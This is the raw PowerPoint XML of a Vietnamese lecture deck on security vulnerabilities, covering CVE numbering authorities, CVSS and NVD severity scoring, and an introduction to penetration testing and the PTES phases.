          <p:cNvPr id="1026" name="Picture 2" descr="Image result for sans top 25 errors">
            <a:hlinkClick r:id="rId4" action="ppaction://hlinkfile"/>
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E0E930D8-A5D7-4557-A98C-4D9534B8B23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48600" y="3124200"/>
            <a:ext cx="3377123" cy="12945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49540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79C28-2114-4D5A-AB74-51A557307838}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{601FE7E9-52AC-4B0A-852F-D3B46CD6051A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Số CVE (CVE-ID) đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>ợc gán bởi các CNA (CVE Numbering Authority). Có 3 loại CNA chính:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Mitre Corporation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> (chính)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Các công ty phát triển phần mềm (Microsoft, Oracle, HP, Red Hat,...)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Đơn vị thứ 3 nh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:hlinkClick r:id="rId4" tooltip="CERT Coordination Center"/>
              </a:rPr>
              <a:t>CERT Coordination Center</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> có thể gán số CVE với những sản phẩm không đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>ợc các CNA khác gán.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>Tìm kiếm CVE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>Vulnerability Statistic</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US">
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>Top 50 products by Total Number Of "Distinct" Vulnerabilities in 2017</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39328129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79C28-2114-4D5A-AB74-51A557307838}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{601FE7E9-52AC-4B0A-852F-D3B46CD6051A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Phụ thuộc vào khả năng bị khai thác, các lỗ hổng bảo mật có mức độ nghiêm trọng (severity) khác nhau.  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Mức độ nghiêm trọng của một lỗ hổng CVE đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>ợc tính theo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>hệ thống CVSS (Common Vulnerability Scoring System) của FIRST (Forum of Incident Response and Security Teams)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>NVD (U.S National Vulnerability Database) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>dựa trên CVE cũng cung cấp một </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>hệ thống tính điểm mức độ nghiêm trọng của lỗ hổng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9709765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79C28-2114-4D5A-AB74-51A557307838}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6B46DB2A-9E60-4C28-AB49-D0BFD8557B4C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="1524000"/>
            <a:ext cx="11667729" cy="3603704"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A3540E2B-C869-42DD-933B-326ABCDECA98}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1524000"/>
            <a:ext cx="10515600" cy="4652963"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="342900" indent="-342900" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
              <a:defRPr sz="2400" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="514350" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
              <a:defRPr sz="2000" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="857250" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1200150" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1543050" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Arial"/>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endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:hlinkClick r:id="rId3" action="ppaction://hlinkfile"/>
              </a:rPr>
              <a:t>Ví dụ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6279103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6F3DA-5342-4377-BF36-525F614368F7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="533401"/>
            <a:ext cx="9829800" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kiểm thử thâm nhập (Penetration Testing)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2DD6DA07-C924-4DD4-AE9A-FF8391633B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43800" y="2050976"/>
            <a:ext cx="3816424" cy="381642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7" name="TextBox 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00BC2692-6620-4A34-ADD1-F6C0D81A8837}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="685800" y="2203376"/>
            <a:ext cx="6096000"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r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>* Kiểm thử thâm nhập </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>(Pen</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>etration </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>test</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>) là </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>kiểm thử bảo mật hệ thống dựa trên việc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>mô phỏng phương pháp mà kẻ tấn công có thể sử dụng để phá </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>vỡ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> kiểm soát an ninh và truy cập vào hệ thống. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>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PTES </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>(Penetration Testing Execution Standard): Chuẩn thực hiện kiểm thử thâm nhập</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41259361"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition spd="slow">
    <p:push dir="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542007A9-9FD0-415F-80DB-88A32A93B361}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>                                                                                           Kiểm thử thâm nhập (Penetration Testing)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="360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20D93242-824D-4297-AF29-E88516DD84DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1066800" y="1584960"/>
            <a:ext cx="670560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3000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các giai đoạn của PTES</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="3000" b="1">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DA7238EE-2106-42DF-A1EE-C69C087A87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28800" y="2175860"/>
            <a:ext cx="8496944" cy="4834540"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:softEdge rad="112500"/>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Title 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C48A8B63-B06D-4649-B969-BCAB7BD4315E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4800600" y="897731"/>
            <a:ext cx="9829800" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr sz="4000" b="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="36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98915364"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition spd="slow">
    <p:push dir="u"/>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542007A9-9FD0-415F-80DB-88A32A93B361}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>                                                                                           Kiểm thử thâm nhập (Penetration Testing)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="3600">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C48A8B63-B06D-4649-B969-BCAB7BD4315E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4800600" y="897731"/>
            <a:ext cx="9829800" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr sz="4000" b="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="3600">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3341F27E-154B-47D1-AEDE-74C9A0AFAA3F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="990600" y="1752600"/>
            <a:ext cx="10363200" cy="4351338"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="342900" indent="-342900" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
              <a:defRPr sz="2400" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="514350" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
              <a:defRPr sz="2000" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
